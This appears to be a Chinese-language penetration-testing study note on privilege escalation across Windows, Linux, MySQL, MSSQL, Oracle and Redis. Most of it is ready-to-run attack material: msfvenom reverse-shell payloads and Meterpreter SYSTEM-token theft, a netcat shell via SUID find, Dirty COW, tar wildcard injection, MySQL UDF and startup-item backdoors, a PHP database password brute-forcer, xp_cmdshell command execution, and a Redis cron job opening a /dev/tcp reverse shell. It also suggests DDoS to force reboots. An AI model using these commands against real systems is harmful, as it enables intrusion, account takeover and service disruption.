打开cmd添加一项计划任务，在15:13打开一个cmd窗口，发现打开的窗口是system权限 1at 15:13 /interactive cmd.exe 这是一个设计上的逻辑错误。Windows中使用命令创建计划任务（at、schtasks） SC 适用范围：03/08、12/16 创建一个名叫“syscmd”的服务，运行它，发现得到的cmd窗口是system权限 12sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interactsc start syscmd PS 适用范围：适用于Win2003 &amp; Win2008 下载微软官方的PsTools工具包，在下载的文件夹下执行下面的命令，发现得到的cmd窗口是system权限 1psexec.exe -accepteula -s -i -d cmd.exe 令牌窃取及权限提升「老」 主要发生在：windows2008 win7左右的系统，才能使用，现在应该就很少了。因为普通用户没办法通过令牌枚举来发现system或者administrator的令牌。所以没办法进行窃取。要发现这些令牌，可以使用烂土豆进行令牌模拟，这样就可以使用令牌窃取了。 一般都使用MSF进行令牌窃取，流程： 在本地msf服务器上，执行以下命令，生成反弹shell木马 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=??? -f exe -o /root/xx.exe 在本地msf服务器上执行以下命令，监听端口 12345678msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 0.0.0.0set lport 6677show optionsexploit 将该木马xx.exe，上传到远程目标服务器，并运行木马程序。 本地监听到会话，查看权限为普通用户xiaodi 提权： 123use incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 进程注入（DLL劫持）「老」 Windows2003&amp;10 进程注入提升 进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 windows2008 之前操作系统上，所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统，因为是系统特性，所以不会被杀软拦截。 pinjector 进程注入工具针对-win2008 以前操作系统 上传到目标机器 运行： 1234pinjector.exe //运行命令，查看用法pinjector.exe -l //列出可注入的进程pinjector.exe -p 416 cmd.exe 6688 // pinjector.exe -p pid cmd.exe 6688 注入到系统正常的服务里，监听6688端口（后面是否为system权限）nc 192.168.131.111 6688 // 监听6688端口，成功反弹shell，成功提权 绑定：通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。 其原理是：查看这个软件运行了什么dll，我们就替换这个dll，当程序启动的时候，就会自动调用这个dll达到提权（如果这个软件的运行权限是system） 烂土豆MS16-075配合令牌窃取提权 单纯令牌窃取：适用于web权限或本地提权，如配合烂土豆提权：适用于web或数据库等权限，因为这些权限才有模拟令牌的权限。 如果可以模拟令牌就可以枚举诸如system的令牌，就可以使用令牌窃取达成权限提升。 RottenPotato原理 RottenPotato（烂土豆）提权的原理可以简述如下： 欺骗 “NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。 对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。 模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。 所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即非服务类用户权限无法窃取成功。 具体权限（whoami /priv）/要求为： 需要支持SeImpersonate或者SeAssignPrimaryToken权限（用来模拟令牌） 注意RPC端口 需要安装.NET Framework 烂土豆比热土豆的优点是： 100%可靠 （当时）全版本通杀。 立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。 总之，我对这个的理解是通过中间人攻击，将COM（NT\\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。 烂土豆下载资源 windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits (github.com) foxglovesec/RottenPotato: RottenPotato local privilege escalation from service account to SYSTEM (github.com) 烂土豆提权流程 上传烂土豆----------&gt;执行烂土豆----------&gt;利用窃取模块----------&gt;窃取SYSTEM----------&gt;成功 上传后门，生成一个后门，并上传到目标服务器。 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe 启动监听 123456msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 5577exploit 受害机执行后门 确定当前为webshell权限。getuid 单纯令牌窃取 123use incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 提权失败，单纯用令牌窃取提权需要有一定的权限，这里的权限太低。 借助烂土豆提权 上传potato.exe 在刚才的test的基础之上，再执行potato.exe 执行即可 12345cd C:\\\\execute -cH -f ./potato.exeuse incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 注意的点 单纯令牌窃取是在一定的权限下才能实施成功的，需要有枚举system令牌的权限。 如果是普通权限，则使用烂土豆可以将令牌进行模拟，再使用令牌窃取完成攻击 DLL劫持提权应用配合MSF——web权限 Windows程序启动的时候需要DLL库进行支持。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索： 1、应用程序加载的目录 2、C:\\Windows\\System32 3、C:\\Windows\\System 4、C:\\Windows 5、当前工作目录 Current Working Directory，CWD 6、在 PATH 环境变量的目录（先系统后用户） CS中的使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升，但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法 DLL劫持提权流程 信息收集----------&gt;进程调试----------&gt;制作 dll 并上传----------&gt;替换 dll----------&gt;启动应用后成功 信息收集：服务器上有的第三方软件 一般看有什么程序的文件夹 进程调试：程序运行的事=时候调用了那些dll（火绒剑可以看） 一般一些写在system的dll是改不了的，所以看存在程序同名目录下的dll文件。 找到该dll，用msf生成木马进行替换： 12msfvenom -p windows/meterpreter/reverse_tcplhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll MSF启动监听，然后配合令牌窃取成功提权 12345678910msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 6677exploituse incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 注意 dll劫持提权需要特定软件应用的控制权限及启用配合，复杂鸡肋 AlwaysInstallElevated提权默认禁用配置，利用成功机会很少 不带引号服务路径配合MSF 当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行，像这样。 带引号： 不带引号： 不带引号而且不安全的： 一旦我们使用了不带引号的方式执行命令，且命令中路径包含空格，将会出现这种情况： 首先是正常的（我直接拖进来的程序）： 不正常的： 因为有空格，那么后面的字符串就被认为是参数，传入到Program这个“程序”中，然而，没有这个程序。如果我们自己伪造一个Program程序，那么即可执行！ 流程 使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录 启动服务/重启。 启动服务。可以在webshell中或者本地启动服务。但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。 重启啥的，可以使用ddos攻击 不安全服务权限配合MSF——本地权限 即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。例如，可以直接修改它导致重定向执行文件。这样我们可以达到这样的效果： 修改服务项中的运行地址，将之从安全的，带引号的服务路径，变成不带引号的。 改成我们自己的木马地址 流程 检测服务权限配置----------&gt;制作文件并上传----------&gt;更改服务路径指向----------&gt;调用后成功 检测服务权限配置 使用accessChk这个命令，他是官方的，所以不会被杀掉。执行命令，检测当前用户所在组的服务权限（实战中一般都不是administrators组，这里仅做测试用），列出的都是当前用户可以操作的服务 1accesschk.exe -uwcqv &quot;administrators&quot; * 制作木马并上传 看到有哪些可以更改的服务，那就到该服务下，改其地址！ 执行命令更改： 1sc config &quot;NewServiceName&quot; binpath=&quot;C:\\Program.exe&quot; 启动服务 Linux提权 与windows一样，也是有web和本地提权之分 用户权限 使用id查看：超过1000是普通用户 信息搜集 包括：内核信息（cat /proc/version，uname -a）、用户群组（id，who，cat /etc/group）、环境信息（环境变量中可能存在密码或API密钥cat /etc/profile，/etc/bashrc）、进程服务、计划任务、有无ssh私钥（cat ~/.ssh/authorized_keys）、有无明文密码（配置文件，config之类的）、可读写执行目录。 自动化搜集： 信息：LinEnum（./LinEnum.sh），linuxprivchecker（python2 linuxprivchecker.py -w -o linuxprivchecker.log） 漏洞：linux-exploit-suggester，linux-exploit-suggester2 信息搜集有助于下一步的攻击、采取什么payload与攻击路线。 而LinEnum主要检测的，除了上述，就是一些特权访问的文件、作业、任务、一些web的版本信息等 SUID提权 **SUID（set user id）是一种授予文件的权限类型，允许用户以其所有者的权限执行文件。**例如，ping实用程序需要root权限才能打开网络套接字，但它也需要由标准用户执行，以验证与其他主机的连接。通过将ping程序标记为SUID（所有者为root），只要标准用户执行ping程序，便会以root特权 执行ping。 但是如果某些现有的二进制文件和实用程序具有SUID权限，则可以使用它们将权限升级到root，我们可以使用它来提升我们的特权。 之前遇到的：两个指令，一个是cp，一个是unzip，使用第一个指令，复制一个文件，那么我们就可以用自己的权限打开root才能打开的文件，第二个也是。 允许权限提升的已知Linux可执行文件包括： Nmap / Vim / find / Bash / mv / More / Less / Nano / cp 流程 查找SUID可执行文件 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 他们的特征是：有个s在他们的权限中，就是以super权限执行的程序（针对可执行文件或目录，使文件在执行阶段，临时拥有文件所有者的权限）。而且他们own by root。 如果是使用chomod u+s ???那就是SUID 利用方式参考：https://pentestlab.blog/2017/09/25/suid-executables/ 特定SUID利用 12345touch xiaodifind xiaodi -exec whoami \\;find xiaodi -exec netcat -lvp 5555 -e /bin/sh \\;netcat xx.xx.xx.xx 5555 内核漏洞提权 上传并使用脚本：linux-exploit-suggester，linux-exploit-suggester2来看看有哪些漏洞。然后上github找对应的exp。 webshell权限与脏牛提权 漏洞范围： Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复） 危害： 低权限用户利用该漏洞可以在众多Linux系统上实现本地提权 简要分析： 该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。 参考：脏牛Linux本地提权漏洞复现(CVE-2016-5195) 流程 找到攻击点，得到webshell，搜集信息，上传exp，然后编译运行： exp:https://github.com/gbonacini/CVE-2016-5195 https://www.jianshu.com/p/df72d1ee1e3e 123456upload /root/dcow.cpp /tmpshellls g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutilpython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;./dcow 环境变量提权（配合SUID） 背景知识 使用echo命令显示当前PATH环境变量： 12echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games 如果你在PATH变量中看到 《.》，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。 参考：https://blog.csdn.net/qq_50854790/article/details/120941341 操作 前提： 配合 SUID 进行环境变量提权 本地用户权限 流程：手写调用文件+编译+复制文件+增加环境变量+执行触发 手写调用文件（这一步是我们为了测试用的，如果要使用这个方法进行提权，那么应该本身就要有这个suid的文件） 123456789101112131415gcc demo.c -o shellchmod u+s shellls -la shellcp /bin/sh /tmp/psexport PATH=/tmp:$PATH./shellid# 或者cd /tmpecho “/bin/sh” &gt; pschmod 777 psexport PATH=/tmp:$PATHcd /home/raj/script./shell demo.c 1234567#include&lt;unistd.h&gt;void main()&#123; setuid(0); setgid(0); system(&quot;ps&quot;); &#125; 复制文件：cp /bin/sh /tmp/ps，把/bin/sh复制给/tmp/ps，ps命令本来是用于显示当前进程的状态，复制后执行./ps就变成了执行sh命令。 增加环境变量：export PATH=/tmp:$PATH 执行触发：./shell 解释：首先我们编一个触发ps命令的二进制文件，当然，其他指令也行，然后将/bin/sh这个文件复制到一个地方，这个地方是我们可以执行文件的，例如这个地址是/tmp，并且重新命名为ps，这样，我们运行/tmp/ps就相当于运行sh，后面，我们添加环境变量，则，将tmp下面的二进制文件都包括进来，也就是使用ps将不再是原来的功能，而是执行sh（顺序关系），所以，当我们运行我们的二进制文件时，会调用被替换的ps（即/tmp/ps），执行sh。 而关于提权，因为我们编译后，这个shell文件可能会是suid的文件，也就是带有s权限的文件，这样我们运行就可以以root运行了。 计划任务 crontab 路径or权限问题 利用计划任务指向的文件的相对路径解析问题 流程： 执行命令：cat /etc/crontab查看当前系统的定时任务，发现一个test.sh任务没有写绝对路径，而且是以root权限运行的。 没有写绝对路径，即默认调用/usr/local/bin目录下的test.sh脚本 看这个文件可不可写 如果可以写（也就是权限过大），更改成可以创建shell的命令即可 如果不可以，则自己写一个与test.sh同名的脚本 12echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt;/tmp/bash -p 如果root用户执行的脚本使用具有完全访问权限的目录，则删除该文件夹并创建一个 符号链接文件夹到另一个服务于您控制的脚本的文件夹可能会很有用。 命令问题 利用通配符配合命令参数自定义命令实现提权 流程： 执行命令：cat /etc/crontab查看当前系统的定时任务，发现一个test.sh任务里面有敏感的命令：tar cvf /var/tmp/backup.tar.gz ，而且是以root权限运行的。 在/var/tmp/下创建三个文件。 123echo &#x27;cp bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/undead/script/test.shecho &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;echo &quot;&quot; &gt; --checkpoint=1 当压缩文件--checkpoint-action=exec=sh test.sh和文件--checkpoint=1时，会有： 1tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh 而 --checkpoint、–checkpoint-action正好是tar命令的参数，打包到这里就会导致tar命令直接把–checkpoint=1和–checkpoint-action=exec=sh test.sh两个文件名当做参数执行，而不打包文件。 –checkpoint-action=exec=sh test.sh参数的意思是执行同目录下test.sh文件，test.sh文件内容又是 1cp bin/bash /tmp/bash; chmod +s /tmp/bash 把 bin/bash拷贝给/tmp/bash并给/tmp/bash赋SUID权限。此时我们再执行/tmp/bash就享有了suid权限，所以这里是一环套一环的 其他类似tar提权的命令还有chown、chmod、rsync 利用条件：root执行脚本+提权的命令+有通配符* 第三方服务——Linux提权数据库MySQL_UDF 这里只是简单介绍一下流程，首先拿到webshell之后，转移给meterpreter。具体方法可以看Raven2打靶。之后进行信息搜集。 上传冰蝎的webshell / 上传LinEnum，查看到有Mysql服务 全局找或者自己动手找config，发现： 12345find /var/www -name *config*/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php/var/www/html/wordpress/wp-admin/setup-config.php/var/www/html/wordpress/wp-config.php/var/www/html/wordpress/wp-config-sample.php 找到数据库的密码：R@v3nSecurity。则使用msf连接： 12mysql -u root -pEnter password: R@v3nSecurity 接下来就是UDF的常规操作了，首先看版本和安装目录。版本不行则用不了UDF，安装目录不知道则导出不了UDF.so文件。 1234567891011121314151617mysql&gt; select @@basedir;select @@basedir;+-----------+| @@basedir |+-----------+| /usr |+-----------+1 row in set (0.00 sec)mysql&gt; select @@version;select @@version;+-----------------+| @@version |+-----------------+| 5.5.60-0+deb8u1 |+-----------------+1 row in set (0.00 sec) 实施操作，下载UDF文件，编译 12345wget https://www.exploit-db.com/download/1518mv 1518 raptor_udf.cgcc -g -c raptor_udf.cgcc -g -shared -o raptor_udf.so raptor_udf.o -mv raptor_udf.so udf.so 创表，输出文件。这里我踩了个坑，我以为直接输出到lib/plugin，结果不是，是需要在mysql目录下的。 123456789use mysqlcreate table ha4k(line blob);insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));# 输出恶意soselect * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;# 创建函数create function do_system returns integer soname &#x27;1518.so&#x27;;select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);&lt;mod u+s /usr/bin/find&#x27;); 后面查找特权命令：find / -user root -perm 4000 -print 2 &gt; /dev/null OKOK，提权成功！ Linux 提权提升漏洞查找关注点-拓展总结 提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等) 最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本) 本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用） 其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等) SUDO 说明参考：https://www.freebuf.com/vuls/217089.html https://www.exploit-db.com/ https://www.vulnhub.com/entry/raven-2,269/ https://github.com/offensive-security/exploitdb 数据库提权 在没有办法对系统进行提权的条件下，我们可以使用数据库进行提权，但需要知道数据库提权的前提条件： 服务器开启数据库服务及获取到最高权限的用户密码 除了Access数据库外，其他数据库基本存在提取的可能 我们需要明确： 数据库应用提取那在权限提升中的意义 即：我们获得webshell，但是权限很低，我们通过某种方式获得数据库权限（root），于是通过这个数据库权限提升我们的webshell权限，或者直接给我们开一个用户啥的 web或本地提权如何探针数据库应用 数据库提权权限用户名密码搜集等方法 读取网站的配置文件（了解其命名规则以及查找技巧） 关键字：sql data inc config conn database common include WWW/cms/inc/conn.info.php WWW/cms/install/source/config.ini.php 读取数据库存储或备份文件（了解其数据库存储方式以及对应内容） 例如：mysql：@@basedir/data/数据库名/表名.myd存的是表中的数据，而用户名密码存在一个叫user的表中，使用select * from mysql.user可以查询到 使用脚本暴力破解（了解数据库是否支持外联以及如何开启外联） 外联：只支持本机连接本机，不允许外部连接。如果不支持，那就上传脚本，如果支持，那就在自己电脑上运行。以下脚本保存在web服务器中，我们访问即可。 不支持外联 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;html&gt; &lt;head&gt; &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;cent一下er&gt; &lt;br&gt;&lt;br&gt; &lt;h1&gt;Mysql账号密码在线爆破工具 V2.0&lt;/h1&gt; &lt;br&gt;&lt;?php if(@$_POST[&#x27;submit&#x27;])&#123; $host = @$_POST[&#x27;host&#x27;]; if($host!==&quot;&quot;)&#123; $username = &quot;root&quot;;//用户名字典 $password = array(); $filename = &quot;pwd.txt&quot;; //同目录下密码字典 $i=0; $file = fopen($filename,&#x27;r&#x27;); while(! feof($file))&#123; $password[$i] = fgets($file); $i++; &#125; fclose($file); echo &quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;; for ($l=0; $l &lt;= count($password); $l++) &#123; $password1 = trim($password[$l]); //除去左右空白 if(@mysql_connect($host, $username, $password1))&#123; echo &quot;&lt;script&gt;alert(&#x27;数据库密码为：&#123;$password1&#125;&#x27;)&lt;/script&gt;&quot;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;.@$password1.&quot;&lt;/font&gt;&quot;; break; &#125;else&#123; continue; &#125; &#125; echo &quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;; &#125; &#125;?&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;Completion.php&quot; method=&quot;post&quot;&gt; 数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt; &lt;/form&gt;&lt;center&gt;&lt;/body&gt; &lt;/html&gt; 支持外联：远程本地暴力破解，服务器本地破解 123456789msfconsolesearch mysqluse auxiliary/scanner/mysql/mysql_loginshow optionsset rhost 47.99.71.28set username rootset pass_file /opt/mysql_pwd.txtshow optionsexploit 目前数据库提权对应的技术以及方法 数据库端口号 关系型 类型 数据库 默认端口 关系型 Oracle 1521 Sql server 1433 Mysql 3306 Pointbase 9092 Db2 50000 Sybase 5000 PostgreSQL 5432 非关系型 MongoDB 27017 Redis 6379 memcached 11211 Mysql（UDF/MOF/启动项/反弹shell） 文件存储方式 存储数据的目录是Mysql/data/数据库名/表名.myd，里面有表里的数据。而用户名密码存在一个叫user的表中，使用select * from mysql.user可以查询到，我们可以在Mysql/data/mysql/user.myd中找到该文件！ UDF UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。 udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。 前提是：得到数据库的账号密码（root），先导出dll，导出目录必须可以加载dll文件（secure_file_priv项设置为空），然后我们再执行命令。需要注意的问题，识别Mysql的版本 小于5.1：导出目录：c:/windows或system32 大于等于5.1：导出安装目录/lib/plugin（这个plugin目录需要自己建立或者利用NTFS流创建） 1select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;; 怎么判定版本：select @@version 怎么找到目录：select @@basedir，show variables like ‘%plugins%’ 怎么快速操作： 例如，我们知道了目录为：c:/mysql/，版本为5.5.3，则在mysql/lib下创建目录，有：mysql/lib/plugin 设置secure_file_priv项为空（my.ini） 我们有一个dll，将至上传（安装）到该目录下。就可以执行了。 过程中我们需要上传一个webshell到服务器上，然后再攻击。这个webshell可以是大马也可以是专门的mysql.php脚本。 如果没有webshell，那就使用dumpfile通过16进制数据流写入udf文件。（当然可以Loadfile） 1select 0x4d5a900..... into dump file &quot;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&quot;; 由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。 流程是：创建表+insert+update concat+dumpfile 注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。 相关问题： 函数已存在： Function ‘sys_eval’ already exists。可以直接调用就调用，没办法的话就删了重新添加，如果存在但是用不了，那就重启数据库，然后重新创建。 位数不对：Can’t open shared library ‘udf.dll’ (errno: 193 )。更换32/64位 参考： https://www.freebuf.com/articles/database/291175.html 可以在上面的linux提权那里看一些操作 MOF 成功率最低。MOF是windows中的一个文件，可以每隔5秒监控进程创建和死亡。如果我们替换这个文件，那么我们就可执行我们上传的mod，其中有一段是vbs脚本，所以可以运行cmd命令，一般是添加用户（以mysql-root权限）。 导出自定义 mof 文件到系统目录加载 同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv= 所以流程如下： 准备一个mof文件，以及前置条件，例如root权限，目录可写等等。 使用select load_file(...) into dumpfile &quot;c:/mysql...&quot;，替换mof。 过一会就可以了。 参考：https://blog.csdn.net/Zlirving_/article/details/106618559 启动项提权 （基于配合操作系统自启动） 导出自定义可执行文件到启动目录配合重启执行 将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！ 我们需要开启外联（大马里有相关命令）GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' INDENTIFIED BY 'root' WITH GRANT OPTION;（执行这个当然需要root权限） 流程如下： 要么～使用msf中的mysql_start_up模块提升权限即可 要么～上传bat文件：将创建好的bat文件进行服务器启动项写入，配合重启执行！ bat文件实例。 12@echonet user xxx 123!@#ws /add 使用DDoS，让服务器重启！ 反弹shell nc -l -p 5577 nc相关知识：https://www.cnblogs.com/-chenxs/p/11748488.html 流程如下： 要么自己创建反弹函数 要么使用mysql.php创建一个反弹函数backdoor。 MSSQL 特点： 默认支持外联 xp_cmdshell xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。 当我们使用这个函数执行命令的时候会提示：访问组件xp_cmdshell过程被阻止 则我们需要开启： 1234EXEC sp_configure &#x27;show advanced options&#x27;, 1RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE; 使用： 1EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27; 如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复 1exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll&#x27; sp_oacreate 提权 主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。同样，他会默认关闭，遇到和xp_cmdshell一样的问题，则打开： 1234EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE WITH OVERRIDE; 使用（注意，我们需要对输出结果重定向，不然可能输出不出来，后面我们用webshell看就好了）： 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt; c:\\\\1.txt&#x27; 沙盒提权 参考资料：https://blog.51cto.com/11797152/2411770 按照步骤来就好 提权语句（show advanced options设置为1就是可以更改配置）： 12exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure; 不开启的话在执行 xp_regwrite 会提示让我们开启 12exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure; 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。 12exec master..xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0; 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句 12exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;,&#x27;SandBoxMode&#x27; 执行系统命令 12select * fromopenrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;) 沙盒模式SandBoxMode参数含义（默认是2） 0：在任何所有者中禁止启用安全模式 1：为仅在允许范围内 2：必须在access模式下 3：完全开启 openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序 12345678--恢复配置（暂不执行）--exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;--exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;--exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure; ORACLE 测试： 普通用户模式：拥有一个普通用户权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令 DBA用户模式：拥有DBA账户密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试 注入提升模式：拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证 注： jsp网站后门不用提权，默认就是system权限 Oracle工具提权 先使用sqlmap扫一下看是不是存在注入点，然后用rebeyond的工具干就完事了。 Redis Redis未授权漏洞：可以以root运行+使用内置指令+写入ssh密钥 常用指令： 1234567891011# 链接数据库redis-cli -h &lt;ip&gt; -p 6397 -a &lt;passwd&gt;# 查看信息info# 设置变量/获取变量set x &quot;test&quot;get x# 删除数据库flushall# 设置主从关系slaveof ip port 计划任务反弹shell 计划任务（路径：/var/spool/cron）。执行命令如下： 12345redis-cli -h 192.168.80.137set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.80.137/5555 0&gt;&amp;1\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 注意改一下IP端口就可以了，在自己的主机上：nc -l -p 5555 写入ssh-keygen 条件： 以root启动 开放ssh服务 未授权 流程： 在攻击机生成一个公钥文件： 123cd /root/.ssh/ #如果.ssh不存在的话,创建.ssh文件夹。ssh-keygen -t rsa #执行完命令然后回车三次就结束了。cat id_rsa.pub 未授权或者弱口令访问redis服务，并写入公钥： 12345redis -h 192.168.223.132 登录redis服务config set dir /root/.ssh/ #设置保存路径config set dbfilename authorized_keys #设置保存文件名set x &quot;\\n\\n\\n ??? \\n\\n\\n&quot; #将公钥写入x键，用&quot;\\n\\n\\n&quot;包裹住公钥，并且跟公钥之间用空格隔开save # 保存 用私钥进行登录： 1ssh -i id_rsa #第一次登陆需要输入yes 主从复制 为了缓解数据库压力，redis使用两个服务器，一个负责读一个负责写，来减轻流量压力。在两个redis服务器设置主从模式的时候，主机实例可以通过FULLRESYNC指令同步文件在从机实例上，然后在从机上加载。 如果同步了恶意so文件，则从机加载该文件，我们主机就可以执行拓展命令。 条件： 服务器允许与其他IP发起TCP请求 允许主从复制 版本：4.x-5.0.5（可以编译so文件） 流程： 攻击机对受害机：slaveof ip port 使用Redis-RCE工具获取受害机的反弹shell（使用nc模拟Redis主服务器，进行模拟Redis主从交互过程） 实现： 